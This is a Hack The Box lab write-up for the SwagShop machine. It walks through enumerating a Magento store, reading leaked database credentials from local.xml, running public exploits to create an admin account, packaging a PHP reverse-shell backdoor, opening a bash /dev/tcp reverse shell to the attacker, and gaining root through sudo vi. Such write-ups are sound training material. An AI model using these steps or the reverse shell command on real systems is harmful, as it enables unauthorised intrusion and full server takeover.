---
layout: post
title: Hack The Box SwagShop
---

Swagshop was a fun box to do, but I had to redo my process to own the box since they changed the exploit I used originally.

# SwagShop
10.10.10.140

```
nmap -sV -sC 10.10.10.140
Starting Nmap 7.80SVN ( https://nmap.org ) at 2019-11-22 18:22 NZDT
Nmap scan report for 10.10.10.140
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
```

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.140 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.140
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/11/22 18:29:56 Starting gobuster
===============================================================
/index.php (Status: 200)
/media (Status: 301)
/includes (Status: 301)
/install.php (Status: 200)
/lib (Status: 301)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/var (Status: 301)
/errors (Status: 301)

```

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.140/index.php/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.140/index.php/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/22 18:38:46 Starting gobuster
===============================================================
/home (Status: 200)
/0 (Status: 200)
/contacts (Status: 200)
/catalog (Status: 302)
/admin (Status: 200)
/core (Status: 200)
/install (Status: 302)
/cms (Status: 200)
/api (Status: 200)
/checkout (Status: 302)
/wishlist (Status: 302)
/customer-service (Status: 200)

```

https://github.com/steverobbins/magescan

```
php magescan.phar scan:all http://10.10.10.140
Scanning http://10.10.10.140/...

                       
  Magento Information  
                       

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+

                     
  Installed Modules  
                     

No detectable modules were found

                       
  Catalog Information  
                       

+------------+---------+
| Type       | Count   |
+------------+---------+
| Categories | Unknown |
| Products   | Unknown |
+------------+---------+

           
  Patches  
           

+------------+---------+
| Name       | Status  |
+------------+---------+
| SUPEE-5344 | Unknown |
| SUPEE-5994 | Unknown |
| SUPEE-6285 | Unknown |
| SUPEE-6482 | Unknown |
| SUPEE-6788 | Unknown |
| SUPEE-7405 | Unknown |
| SUPEE-8788 | Unknown |
+------------+---------+

           
  Sitemap  
           

Sitemap is not declared in robots.txt
Sitemap is not accessible: http://10.10.10.140/sitemap.xml

                     
  Server Technology  
                     

+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.18 (Ubuntu) |
+--------+------------------------+

                          
  Unreachable Path Check  
                          

+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
| .bzr/                                        | 404           | Pass   |
| .cvs/                                        | 404           | Pass   |
| .git/                                        | 404           | Pass   |
| .git/config                                  | 404           | Pass   |
| .git/refs/                                   | 404           | Pass   |
| .gitignore                                   | 404           | Pass   |
| .hg/                                         | 404           | Pass   |
| .idea                                        | 404           | Pass   |
| .svn/                                        | 404           | Pass   |
| .svn/entries                                 | 404           | Pass   |
| admin/                                       | 404           | Pass   |
| admin123/                                    | 404           | Pass   |
| adminer.php                                  | 404           | Pass   |
| administrator/                               | 404           | Pass   |
| adminpanel/                                  | 404           | Pass   |
| aittmp/index.php                             | 404           | Pass   |
| app/etc/enterprise.xml                       | 404           | Pass   |
| app/etc/local.xml                            | 200           | Fail   |
| backend/                                     | 404           | Pass   |
| backoffice/                                  | 404           | Pass   |
| beheer/                                      | 404           | Pass   |
| capistrano/config/deploy.rb                  | 404           | Pass   |
| chive                                        | 404           | Pass   |
| composer.json                                | 404           | Pass   |
| composer.lock                                | 404           | Pass   |
| vendor/composer/installed.json               | 404           | Pass   |
| config/deploy.rb                             | 404           | Pass   |
| control/                                     | 404           | Pass   |
| dev/tests/functional/etc/config.xml          | 404           | Pass   |
| downloader/index.php                         | 404           | Pass   |
| index.php/rss/order/NEW/new                  | 200           | Fail   |
| info.php                                     | 404           | Pass   |
| mageaudit.php                                | 404           | Pass   |
| magmi/                                       | 404           | Pass   |
| magmi/conf/magmi.ini                         | 404           | Pass   |
| magmi/web/magmi.php                          | 404           | Pass   |
| Makefile                                     | 404           | Pass   |
| manage/                                      | 404           | Pass   |
| management/                                  | 404           | Pass   |
| manager/                                     | 404           | Pass   |
| modman                                       | 404           | Pass   |
| p.php                                        | 404           | Pass   |
| panel/                                       | 404           | Pass   |
| phpinfo.php                                  | 404           | Pass   |
| phpmyadmin                                   | 404           | Pass   |
| README.md                                    | 404           | Pass   |
| README.txt                                   | 404           | Pass   |
| shell/                                       | 200           | Fail   |
| shopadmin/                                   | 404           | Pass   |
| site_admin/                                  | 404           | Pass   |
| var/export/                                  | 404           | Pass   |
| var/export/export_all_products.csv           | 404           | Pass   |
| var/export/export_customers.csv              | 404           | Pass   |
| var/export/export_product_stocks.csv         | 404           | Pass   |
| var/log/                                     | 404           | Pass   |
| var/log/exception.log                        | 404           | Pass   |
| var/log/payment_authnetcim.log               | 404           | Pass   |
| var/log/payment_authorizenet.log             | 404           | Pass   |
| var/log/payment_authorizenet_directpost.log  | 404           | Pass   |
| var/log/payment_cybersource_soap.log         | 404           | Pass   |
| var/log/payment_ogone.log                    | 404           | Pass   |
| var/log/payment_payflow_advanced.log         | 404           | Pass   |
| var/log/payment_payflow_link.log             | 404           | Pass   |
| var/log/payment_paypal_billing_agreement.log | 404           | Pass   |
| var/log/payment_paypal_direct.log            | 404           | Pass   |
| var/log/payment_paypal_express.log           | 404           | Pass   |
| var/log/payment_paypal_standard.log          | 404           | Pass   |
| var/log/payment_paypaluk_express.log         | 404           | Pass   |
| var/log/payment_pbridge.log                  | 404           | Pass   |
| var/log/payment_verisign.log                 | 404           | Pass   |
| var/log/system.log                           | 404           | Pass   |
| var/report/                                  | 404           | Pass   |
+----------------------------------------------+---------------+--------+
```

http://10.10.10.140/app/etc/local.xml

```
<config>
    <global>
        <install>
            <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
        </install>
        <crypt>
            <key><![CDATA[b355a9e0cd018d3f7f03607141518419]]></key>
        </crypt>
        <disable_local_modules>false</disable_local_modules>
        <resources>
            <db>
                <table_prefix><![CDATA[]]></table_prefix>
            </db>
            <default_setup>
                <connection>
                    <host><![CDATA[localhost]]></host>
                    <username><![CDATA[root]]></username>
                    <password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
                    <dbname><![CDATA[swagshop]]></dbname>
                    <initStatements><![CDATA[SET NAMES utf8]]></initStatements>
                    <model><![CDATA[mysql4]]></model>
                    <type><![CDATA[pdo_mysql]]></type>
                    <pdoType><![CDATA[]]></pdoType>
                    <active>1</active>
                </connection>
            </default_setup>
        </resources>
        <session_save><![CDATA[files]]></session_save>
    </global>
    <admin>
        <routers>
            <adminhtml>
                <args>
                    <frontName><![CDATA[admin]]></frontName>
                </args>
            </adminhtml>
        </routers>
    </admin>
</config>
```

root
fMVWh7bDHpgZkyfqQXreTjU9


We've found two login screens.

http://10.10.10.140/index.php/admin/
http://10.10.10.140/index.php/customer/account/login/ 

root and admin both fail to login with the password we found.

```
searchsploit magento
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                    | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                              | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                             | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                        | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                          | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                           | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                                                                             | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                             | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                          | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                               | exploits/php/webapps/38651.txt
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

37977.py looks interested

https://www.exploit-db.com/exploits/37977

Modify target url to:
```
target = "10.10.10.140/index.php"
```

python exploit.py 
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme

Success we have logged into the admin panel.

Next we download https://github.com/lavalamp-/LavaMagentoBD
unzip it

```
LavaMagentoBD-master/Backdoor Code/app/code/community/Lavalamp/Connector/controllers
```

Modify IndexControllers.php and replace with a reverse shell

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Make sure you change the ip to the one from ifconfig tun0 and the port to something else. I chose 7889.

```
md5sum IndexController.php 
1946aef02288721ca3cf17776ddef781  IndexController.php
```

Next modify the package.xml file and change the hash to the  the md5sum of the file you modified. 
```
<file hash="1946aef02288721ca3cf17776ddef781" name="IndexController.php"/>
```

```
    cd Backdoor\ Code
    tar -czvf bd.tgz app package.xml skin
    mv bd.tgz ..
```

https://www.exploit-db.com/exploits/37811

http://10.10.10.140/app/etc/local.xml

Date and time

```
request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
```

change 7d to 2y

```
python rce.py http://10.10.10.140/index.php/admin/ "bash -c 'bash -i >& /dev/tcp/10.10.14.72/9001 0>&1'"
```
```
nc -v -n -l -p 9001
listening on [any] 9001 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.10.140] 47110
bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ whoami
whoami
www-data
```
```
sudo -l

Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/var/www/html$ 
```
sudo vi /var/www/html/anator
```
Press shift + :
```
!/bin/bash

whoami
root
```
   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!

```